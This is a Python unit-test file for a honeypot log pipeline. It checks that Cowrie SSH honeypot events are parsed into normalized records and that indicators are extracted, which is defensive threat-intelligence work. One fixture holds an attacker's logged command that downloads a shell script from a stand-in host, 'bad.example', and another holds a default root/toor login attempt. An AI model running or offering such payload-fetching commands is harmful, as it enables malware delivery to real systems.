from __future__ import annotations

import unittest

from honeypot_pipeline.cowrie import iter_normalized_cowrie_events
from honeypot_pipeline.ioc import extract_indicators


class CowrieParserTests(unittest.TestCase):
    def test_normalizes_login_failed_event(self) -> None:
        lines = [
            '{"timestamp":"2026-03-18T12:00:00.000000Z","eventid":"cowrie.login.failed",'
            '"src_ip":"203.0.113.10","src_port":60222,"session":"abc123",'
            '"username":"root","password":"toor","protocol":"ssh"}'
        ]

        [event] = list(iter_normalized_cowrie_events(lines))

        self.assertEqual(event.honeypot, "cowrie")
        self.assertEqual(event.event_type, "cowrie.login.failed")
        self.assertEqual(event.source_ip, "203.0.113.10")
        self.assertEqual(event.source_port, 60222)
        self.assertEqual(event.username, "root")
        self.assertEqual(event.password, "toor")

    def test_extracts_basic_indicators(self) -> None:
        lines = [
            '{"timestamp":"2026-03-18T12:05:00.000000Z","eventid":"cowrie.command.input",'
            '"src_ip":"198.51.100.24","session":"abc124","input":"wget http://bad.example/payload.sh",'
            '"url":"http://bad.example/payload.sh"}'
        ]

        [event] = list(iter_normalized_cowrie_events(lines))
        indicators = extract_indicators(event)

        self.assertEqual(indicators["ip_addresses"], ["198.51.100.24"])
        self.assertEqual(indicators["commands"], ["wget http://bad.example/payload.sh"])
        self.assertEqual(indicators["urls"], ["http://bad.example/payload.sh"])

    def test_rejects_invalid_json_line(self) -> None:
        with self.assertRaisesRegex(ValueError, "Invalid JSON on line 1"):
            list(iter_normalized_cowrie_events(['{"eventid":']))


if __name__ == "__main__":
    unittest.main()

